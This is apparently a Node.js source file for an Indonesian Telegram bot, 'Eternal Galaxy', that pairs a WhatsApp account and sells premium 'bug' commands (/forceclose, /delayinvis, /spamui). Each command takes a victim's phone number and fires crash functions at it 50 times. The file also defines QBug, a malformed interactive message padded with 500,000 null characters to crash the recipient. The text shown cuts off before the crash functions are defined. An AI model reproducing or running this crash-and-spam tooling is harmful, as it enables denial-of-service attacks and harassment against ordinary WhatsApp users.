const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const {
    loadTokensFromGitHub,
    checkToken,
    addToken,
    allowedTokens,
    initializeOctokit,   
    verifyBotToken,
    deleteToken
    
} = require("./authen");
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const { BOT_TOKEN, allowedDevelopers } = require("./config");
const tdxlol = fs.readFileSync('./tdx.jpeg');
const crypto = require('crypto');
const o = fs.readFileSync(`./o.jpg`)
// --- Inisialisasi Bot Telegram ---
const bot = new Telegraf(BOT_TOKEN);

// --- Variabel Global ---
let zephy = null;
let isWhatsAppConnected = false;
const usePairingCode = true; // Tidak digunakan dalam kode Anda
let maintenanceConfig = {
    maintenance_mode: false,
    message: "⛔ Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!"
};
let premiumUsers = {};
let adminList = [];
let ownerList = [];
let deviceList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;
// --- Fungsi-fungsi Bantuan ---
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
// --- Fungsi untuk Mengecek Apakah User adalah Owner ---
const isOwner = (userId) => {
    if (ownerList.includes(userId.toString())) {
        ownerataubukan = "✅";
        return true;
    } else {
        ownerataubukan = "❌";
        return false;
    }
};

const OWNER_ID = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ysudh = "✅";
        return true;
    } else {
        gnymbung = "❌";
        return false;
    }
};

// --- Fungsi untuk Mengecek Apakah User adalah Admin ---
const isAdmin = (userId) => {
    if (adminList.includes(userId.toString())) {
        adminataubukan = "✅";
        return true;
    } else {
        adminataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const saveDeviceList = () => {
    fs.writeFileSync('./ListDevice.json', JSON.stringify(deviceList));
};

// --- Fungsi untuk Menambahkan Device ke Daftar ---
const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({
        number: deviceNumber,
        userId: userId,
        token: token
    });
    saveDeviceList();
    console.log(chalk.white.bold(`
\n
⠀⠀⠀⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
\n
HELLO WORLD😎👋
╭─────────────────
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
╰─────────────────`));
};

// --- Fungsi untuk Mencatat Aktivitas Pengguna ---
const recordUserActivity = (userId, userNickname) => {
    const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
    userActivity[userId] = {
        nickname: userNickname,
        last_seen: now
    };

    // Menyimpan aktivitas pengguna ke file
    fs.writeFileSync('./userActivity.json', JSON.stringify(userActivity));
};

// --- Fungsi untuk Memuat Aktivitas Pengguna ---
const loadUserActivity = () => {
    try {
        const data = fs.readFileSync('./userActivity.json');
        userActivity = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat aktivitas pengguna:'), error);
        userActivity = {};
    }
};

// --- Middleware untuk Mengecek Mode Maintenance ---
const checkMaintenance = async (ctx, next) => {
    let userId, userNickname;

    if (ctx.from) {
        userId = ctx.from.id.toString();
        userNickname = ctx.from.first_name || userId;
    } else if (ctx.update.channel_post && ctx.update.channel_post.sender_chat) {
        userId = ctx.update.channel_post.sender_chat.id.toString();
        userNickname = ctx.update.channel_post.sender_chat.title || userId;
    }

    // Catat aktivitas hanya jika userId tersedia
    if (userId) {
        recordUserActivity(userId, userNickname);
    }

    if (maintenanceConfig.maintenance_mode && !OWNER_ID(ctx.from.id)) {
        // Jika mode maintenance aktif DAN user bukan developer:
        // Kirim pesan maintenance dan hentikan eksekusi middleware
        console.log("Pesan Maintenance:", maintenanceConfig.message);
        const escapedMessage = maintenanceConfig.message.replace(/\*/g, '\\*'); // Escape karakter khusus
        return await ctx.replyWithMarkdown(escapedMessage);
    } else {
        // Jika mode maintenance tidak aktif ATAU user adalah developer:
        // Lanjutkan ke middleware/handler selanjutnya
        await next();
    }
};

// --- Middleware untuk Mengecek Status Premium ---
const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("❌ Maaf, Anda bukan user premium. Silakan hubungi developer @noxxasoloo untuk upgrade.");
    }
};

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    zephy = makeWASocket(connectionOptions);

    zephy.ev.on('creds.update', saveCreds);
    store.bind(zephy.ev);

    zephy.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭─────────────────
┃${chalk.green.bold('WHATSAPP CONNECTED')}
╰─────────────────`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭─────────────────
┃${chalk.red.bold('WHATSAPP DISCONNECTED')}
╰─────────────────`),
                shouldReconnect ? chalk.white.bold(`
╭─────────────────
┃${chalk.red.bold('RECONNECTING AGAIN')}
╰─────────────────`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}

(async () => {
    console.log(chalk.whiteBright.bold(`
╭─────────────────
┃${chalk.yellowBright.bold('SYSTEM ANTI CRACK ACTIVE')}
╰─────────────────`));

    console.log(chalk.white.bold(`
╭━━━━━━─────────────────
┃${chalk.yellow.bold('SUKSES MEMUAT DATABASE OWNER')}
╰━━━━━━─────────────────`));

    loadPremiumUsers();
    loadAdmins();
    loadDeviceList();
    loadUserActivity();
    
    startSesi();

    // Menambahkan device ke ListDevice.json saat inisialisasi
    addDeviceToList(BOT_TOKEN, BOT_TOKEN);
})();
// --- Command Handler ---

// Command untuk pairing WhatsApp
bot.command("addpairing", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addpairing <nomor_wa>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');

    if (!phoneNumber.startsWith('62')) {
        return await ctx.reply("❌ Nomor harus diawali dengan 62. Contoh: /addpairing 628xxxxxxxxxx");
    }

    if (zephy && zephy.user) {
        return await ctx.reply("ℹ️ WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await zephy.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `\`\`\`
┏─────────────────
│   CODE PAIRING    
│╭────────────
││Bot: ${phoneNumber}
││Kode: ${formattedCode}
│╰────────────
┗─────────────────
\`\`\``;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Command /addowner - Menambahkan owner baru
bot.command("addowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addowner <id_user>");
    }

    if (ownerList.includes(userId)) {
        return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
    }

    ownerList.push(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner baru sekarang memiliki akses ke perintah /addadmin, /addprem, dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /delowner - Menghapus owner
bot.command("delowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delowner <id_user>");
    }

    if (!ownerList.includes(userId)) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
    }

    ownerList = ownerList.filter(id => id !== userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner tersebut tidak lagi memiliki akses seperti owner.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /addadmin - Menambahkan admin baru
bot.command("addadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addadmin <id_user>");
    }

    addAdmin(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin baru sekarang memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }]
            ]
        }
    });
});

// Command /deladmin - Menghapus admin
bot.command("deladmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /deladmin <id_user>");
    }

    removeAdmin(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin tersebut tidak lagi memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Daftar Admin", callback_data: "listadmin" }]
            ]
        }
    });
});

// Callback Query untuk Menampilkan Daftar Admin
bot.action("listadmin", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Maaf, Anda tidak memiliki akses untuk melihat daftar admin.");
    }

    const adminListString = adminList.length > 0
        ? adminList.map(id => `- ${id}`).join("\n")
        : "Tidak ada admin yang terdaftar.";

    const message = `
ℹ️ Daftar Admin:

${adminListString}

Total: ${adminList.length} admin.
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// Command /addprem - Menambahkan user premium
bot.command("addprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addprem <id_user> <durasi_hari>");
    }

    const userId = args[1];
    const durationDays = parseInt(args[2]);

    if (isNaN(durationDays) || durationDays <= 0) {
        return await ctx.reply("❌ Durasi hari harus berupa angka positif.");
    }

    addPremiumUser(userId, durationDays);

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Premium User*.

*Detail:*
- *ID User:* ${userId}
- *Durasi:* ${durationDays} hari
- *Kadaluarsa:* ${formattedExpiration} WIB

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Cek Status Premium", callback_data: `cekprem_${userId}` }]
            ]
        }
    });
});

// Command /delprem - Menghapus user premium
bot.command("delprem", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delprem <id_user>");
    }

    if (!premiumUsers[userId]) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    removePremiumUser(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Premium User*.

*Detail:*
- *ID User:* ${userId}

User tersebut tidak lagi memiliki akses ke fitur premium.
    `;

    await ctx.replyWithMarkdown(successMessage);
});
// Callback Query untuk Menampilkan Status Premium
bot.action(/cekprem_(.+)/, async (ctx) => {
    const userId = ctx.match[1];
    if (userId !== ctx.from.id.toString() && !OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.answerCbQuery("❌ Anda tidak memiliki akses untuk mengecek status premium user lain.");
    }

    if (!premiumUsers[userId]) {
        return await ctx.answerCbQuery(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
    }

    const expirationDate = premiumUsers[userId].expired;
    const formattedExpiration = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').format('DD-MM-YYYY HH:mm:ss');
    const timeLeft = moment(expirationDate, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta').fromNow();

    const message = `
ℹ️ Status Premium User *${userId}*

*Detail:*
- *ID User:* ${userId}
- *Kadaluarsa:* ${formattedExpiration} WIB
- *Sisa Waktu:* ${timeLeft}

Terima kasih telah menjadi bagian dari komunitas premium kami!
    `;

    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(message);
});

// --- Command /cekusersc ---
bot.command("cekusersc", async (ctx) => {
    const totalDevices = deviceList.length;
    const deviceMessage = `
ℹ️ Saat ini terdapat *${totalDevices} device* yang terhubung dengan script ini.
    `;

    await ctx.replyWithMarkdown(deviceMessage);
});

// --- Command /monitoruser ---
bot.command("monitoruser", async (ctx) => {
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    let userList = "";
    for (const userId in userActivity) {
        const user = userActivity[userId];
        userList += `
- *ID:* ${userId}
 *Nickname:* ${user.nickname}
 *Terakhir Dilihat:* ${user.last_seen}
`;
    }

    const message = `
👤 *Daftar Pengguna Bot:*
${userList}
Total Pengguna: ${Object.keys(userActivity).length}
    `;

    await ctx.replyWithMarkdown(message);
});

// --- Contoh Command dan Middleware ---
const prosesrespone = async (target, ctx) => {
    const caption = `Process...`;

    await ctx.reply(caption)
        .then(() => {
            console.log('Proses response sent');
        })
        .catch((error) => {
            console.error('Error sending process response:', error);
        });
};

const donerespone = async (target, ctx) => {
    const caption = `
╭─────────────────
│ 𝙎𝙐𝘾𝙎𝙀𝙎 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚
╰─────────────────
`;

    await ctx.reply(caption)
        .then(() => {
            console.log('Done response sent');
        })
        .catch((error) => {
            console.error('Error sending done response:', error);
        });
};

const checkWhatsAppConnection = async (ctx, next) => {
    if (!isWhatsAppConnected) {
        await ctx.reply("❌ WhatsApp belum terhubung. Silakan gunakan command /addpairing");
        return;
    }
    await next();
};

const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};

bot.use(checkMaintenance); // Middleware untuk mengecek maintenance

// --- Command /crash (Placeholder for your actual crash functions) ---
bot.command("forceclose", checkWhatsAppConnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await donerespone(target, ctx);

  for (let i = 0; i < 50; i++) {
    await fcapix(target);
    await FlowX(target);
  }
  
});
bot.command("delayinvis", checkWhatsAppConnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await donerespone(target, ctx);

    for (let i = 0; i < 50; i++) {
    await fcapix(target);
    await FlowX(target);
    await fcapix(target);
    }

});
bot.command("spamui", checkWhatsAppConnection, checkPremium, async ctx => {
    const q = ctx.message.text.split(" ")[1];

    if (!q) {
        return await ctx.reply(`Example: commandnya 62×××`);
    }

    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    await donerespone(target, ctx);

    for (let i = 0; i < 50; i++) {
    await fcapix(target);
    await FlowX(target);
    await fcapix(target);
    }

});


bot.start(async (ctx) => {
  // Mengirim status "mengetik"
  await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');

  // Periksa status koneksi, owner, admin, dan premium SEBELUM membuat pesan
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);

  const mainMenuMessage = `\`\`\`
╭─[𖣘] 𝐁‌𝗢𝗧 𝗜𝗡𝗙𝗢 ]──≽
│• 𝗡𝗔𝗠𝗘 : 𝗘𝗧𝗘𝗥𝗡𝗔𝗟 𝗚𝗔𝗟𝗔𝗫𝗬
│• 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 : 𝟭.𝟬
╰────────────────≽
╭─[𖣘] 𝗜𝗡𝗙𝗢 𝗦𝗧𝗔𝗧𝗨𝗦 ]─≽
│  ɴᴀᴍᴇ ʙᴏᴛ : 𝗘𝗧𝗘𝗥𝗡𝗔𝗟 𝗚𝗔𝗟𝗔𝗫𝗬
│  ᴄʀᴇᴀᴛᴏʀ : @noxxasoloo @HAIKALSTORERE
│  ᴠᴇʀsɪ ʙᴏᴛ : 𝗩𝟭.𝟬
│  ᴀᴅᴍɪɴ : ${isAdminStatus ? '✅' : '❌'}
│  ᴘʀᴇᴍɪᴜᴍ : ${isPremium ? '✅' : '❌'}
╰────────────────≽
\`\`\``;


  const mainKeyboard = [
    [{ 
    text: "「  𝐁͢𝐮͡𝐠𝐌͜𝐞͢𝐧͡𝐮  」",
    callback_data: "ngontol"
    },
    { 
    text: "「  𝐎͢𝐰͡𝐧͜𝐞͢𝐫𝐌͜𝐞͢𝐧͡𝐮  」",
    callback_data: "owneronli"
    }], 
    [{ 
    text: "「  𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥  」", 
    url: "https://t.me/HAIKALSTORERE" 
    }], 
    [{
    text: "「  𝐀͢𝐝͡𝐦͜𝐢͢𝐧𝐌͜𝐞͢𝐧͡𝐮  」",
    callback_data: "admincmd"
    },
    {
    text: "「  𝐓͢𝐡͡𝐧𝐤𝐬𝐓͜𝐨  」", 
    callback_data: "bestfriend"
     }]
  ];

  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/8v6wjc.jpg", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000); // Delay 1 detik
});

// Handler untuk callback
bot.action('bestfriend', async (ctx) => {
  // Hapus pesan menu owner
  await ctx.deleteMessage();
  const ResellerMenu = `\`\`\`
╭──────── ⧼ 𝐓͢𝐡͡𝐧𝐤𝐬𝐓͜𝐨 ⧽
│✆ 𝗡𝗢𝗫𝗫𝗔 -> 𝗗𝗘𝗩 𝗦𝗖𝗥𝗜𝗣𝗧
│✆ 𝗛𝗔𝗜𝗞𝗔𝗟 -> 𝗗𝗘𝗩 𝟮
│✆ 𝗔𝗟𝗟𝗫𝗫𝗚𝗢𝗢𝗗 -> 𝗦𝗨𝗣𝗣𝗢𝗥𝗧
│✆𝗟𝗔𝗧𝗘𝗘𝗫𝗜𝗢 -> 𝗦𝗨𝗣𝗣𝗢𝗥𝗧
│✆𝗦𝗨𝗞𝗜𝗦𝗧𝗢𝗥𝗘 -> 𝗦𝗨𝗣𝗣𝗢𝗥𝗧
│✆𝗨𝗞𝗨𝗠 -> 𝗦𝗨𝗣𝗣𝗢𝗥𝗧
│✆ 𝗭𝗘𝗥𝗢𝗫𝗗 -> 𝗦𝗨𝗣𝗣𝗢𝗥𝗧
╰──────────
\`\`\``;

  const ownerKeyboard = [
    [{
    text: "「  𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥  」", 
    url: "https://t.me/noxxasoloo"
    }, 
    {
    text: "「  𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗗𝗘𝗩  」",
    url: "https://t.me/infoscripteternal"
    }],
    [{
    text: "「 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗘𝗡𝗨 」",
    callback_data: "main_menu"
    }]
  ];




  ctx.replyWithPhoto("https://files.catbox.moe/wbuy9b.jpg", {
      caption: ResellerMenu,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: ownerKeyboard
      }
    });
});
bot.action('admincmd', async (ctx) => {
  // Hapus pesan menu owner
  await ctx.deleteMessage();
  const ResellerMenu = `\`\`\`
╭─────────────────
┃ ✇ /𝗔𝗗𝗗𝗣𝗥𝗘𝗠
┃ ✇ /𝗗𝗘𝗟𝗣𝗥𝗘𝗠
╰─────────────────
\`\`\``;

  const ownerKeyboard = [
    [{
    text: "「  𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥  」", 
    url: "https://t.me/HAIKALSTORERE"
    }, 
    {
    text: "「  𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗗𝗘𝗩  」",
    url: "https://t.me/infoscripteternal"
    }],
    [{
    text: "「 𝗕𝗔𝗖𝗞 𝗧𝗢 𝗠𝗘𝗡𝗨 」",
    callback_data: "main_menu"
    }]
  ];




  ctx.replyWithPhoto("https://files.catbox.moe/luwal1.jpg", {
